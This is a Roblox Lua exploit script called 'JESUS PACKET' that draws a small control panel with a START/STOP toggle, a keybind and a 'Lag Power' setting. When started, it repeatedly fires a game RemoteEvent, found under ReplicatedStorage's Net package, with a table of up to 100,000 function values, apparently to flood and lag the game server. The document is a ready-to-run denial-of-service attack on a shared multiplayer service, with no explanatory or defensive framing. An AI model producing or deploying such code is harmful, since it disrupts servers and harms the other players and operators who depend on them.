-- JESUS PACKET (compact)
repeat task.wait() until game:GetService("Players").LocalPlayer
local P = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local RS = game:GetService("ReplicatedStorage")
local lp = P.LocalPlayer
local pg = lp:FindFirstChild("PlayerGui") or lp:WaitForChild("PlayerGui", 10)
print("[JESUS] 1 start")

for _, v in pairs(pg:GetChildren()) do
    if v.Name == "JESUSPACKET" then v:Destroy() end
end

local gui = Instance.new("ScreenGui")
gui.Name = "JESUSPACKET"
gui.ResetOnSpawn = false
gui.DisplayOrder = 999
gui.Parent = pg
print("[JESUS] 2 gui")

local key = "G"
local intensity = 10000
local active = false
local listening = false

local card = Instance.new("Frame")
card.Size = UDim2.fromOffset(260, 230)
card.Position = UDim2.fromScale(0.5, 0.5)
card.AnchorPoint = Vector2.new(0.5, 0.5)
card.BackgroundColor3 = Color3.fromRGB(10, 12, 16)
card.BackgroundTransparency = 0.15
card.BorderSizePixel = 0
card.ClipsDescendants = true
card.Parent = gui
Instance.new("UICorner", card).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel")
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, -20, 0, 38)
title.Position = UDim2.fromOffset(16, 0)
title.Font = Enum.Font.GothamBold
title.TextSize = 14
title.TextColor3 = Color3.fromRGB(240, 245, 255)
title.TextXAlignment = Enum.TextXAlignment.Left
title.RichText = true
title.Text = '<font color="#00aaff">JESUS</font> PACKET'
title.Parent = card

local btn = Instance.new("TextButton")
btn.Size = UDim2.new(1, -32, 0, 70)
btn.Position = UDim2.fromOffset(16, 52)
btn.BackgroundColor3 = Color3.fromRGB(18, 22, 30)
btn.AutoButtonColor = false
btn.Text = "START"
btn.Font = Enum.Font.GothamBold
btn.TextSize = 22
btn.TextColor3 = Color3.fromRGB(240, 245, 255)
btn.Parent = card
Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 14)

local lbl = Instance.new("TextLabel")
lbl.BackgroundTransparency = 1
lbl.Position = UDim2.fromOffset(18, 130)
lbl.Size = UDim2.new(1, -36, 0, 22)
lbl.Font = Enum.Font.Gotham
lbl.TextSize = 12
lbl.TextColor3 = Color3.fromRGB(160, 180, 200)
lbl.TextXAlignment = Enum.TextXAlignment.Left
lbl.Text = "Lag Power"
lbl.Parent = card

local intBox = Instance.new("TextBox")
intBox.Position = UDim2.fromOffset(16, 154)
intBox.Size = UDim2.new(1, -32, 0, 30)
intBox.BackgroundColor3 = Color3.fromRGB(18, 22, 30)
intBox.BorderSizePixel = 0
intBox.Font = Enum.Font.GothamBold
intBox.TextSize = 14
intBox.TextColor3 = Color3.fromRGB(0, 170, 255)
intBox.Text = tostring(intensity)
intBox.ClearTextOnFocus = false
intBox.Parent = card
Instance.new("UICorner", intBox).CornerRadius = UDim.new(0, 7)

local kLbl = Instance.new("TextLabel")
kLbl.BackgroundTransparency = 1
kLbl.Position = UDim2.fromOffset(18, 190)
kLbl.Size = UDim2.new(0.5, 0, 0, 26)
kLbl.Font = Enum.Font.Gotham
kLbl.TextSize = 12
kLbl.TextColor3 = Color3.fromRGB(160, 180, 200)
kLbl.TextXAlignment = Enum.TextXAlignment.Left
kLbl.Text = "Keybind"
kLbl.Parent = card

local cap = Instance.new("TextButton")
cap.AnchorPoint = Vector2.new(1, 0)
cap.Position = UDim2.new(1, -16, 0, 190)
cap.Size = UDim2.fromOffset(60, 26)
cap.BackgroundColor3 = Color3.fromRGB(18, 22, 30)
cap.BorderSizePixel = 0
cap.Font = Enum.Font.GothamBold
cap.TextSize = 12
cap.TextColor3 = Color3.fromRGB(255, 255, 255)
cap.Text = key
cap.Parent = card
Instance.new("UICorner", cap).CornerRadius = UDim.new(0, 7)
print("[JESUS] 3 card")

local Event
local pkgs = RS:FindFirstChild("Packages")
if pkgs then
    local net = pkgs:FindFirstChild("Net")
    if net then Event = net:GetChildren()[6] end
end
print("[JESUS] 4 Event=" .. tostring(Event and Event.Name or "nil"))

local lagging, lagThread = false, nil
local function startLag()
    if lagging or not Event then return end
    lagging = true
    local n = math.clamp(math.floor(tonumber(intBox.Text) or 10000), 1, 100000)
    local payload = table.create(n, function() end)
    lagThread = task.spawn(function()
        while lagging do
            for _ = 1, 3 do pcall(function() Event:FireServer(payload) end) end
            task.wait(0.01)
        end
    end)
end
local function stopLag()
    if not lagging then return end
    lagging = false
    if lagThread then pcall(task.cancel, lagThread); lagThread = nil end
end

local function toggle()
    active = not active
    if active then
        btn.Text = "STOP"
        btn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
        btn.TextColor3 = Color3.fromRGB(10, 12, 16)
        startLag()
    else
        btn.Text = "START"
        btn.BackgroundColor3 = Color3.fromRGB(18, 22, 30)
        btn.TextColor3 = Color3.fromRGB(240, 245, 255)
        stopLag()
    end
end
btn.MouseButton1Click:Connect(toggle)

intBox.FocusLost:Connect(function()
    local n = tonumber(intBox.Text)
    if n then intensity = math.clamp(math.floor(n), 1, 100000) end
    intBox.Text = tostring(intensity)
end)

cap.MouseButton1Click:Connect(function()
    listening = true
    cap.Text = "..."
end)

UIS.InputBegan:Connect(function(input, gp)
    if listening then
        if input.UserInputType == Enum.UserInputType.Keyboard then
            key = input.KeyCode.Name
            cap.Text = key
            listening = false
        end
        return
    end
    if gp then return end
    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode.Name == key then
        toggle()
    end
end)

local dragging, startPos, startInput
title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging, startPos, startInput = true, card.Position, input.Position
    end
end)
UIS.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local d = input.Position - startInput
        card.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
    end
end)
UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

print("[JESUS] LOADED — keybind=" .. key .. " | event=" .. tostring(Event and Event.Name or "nil"))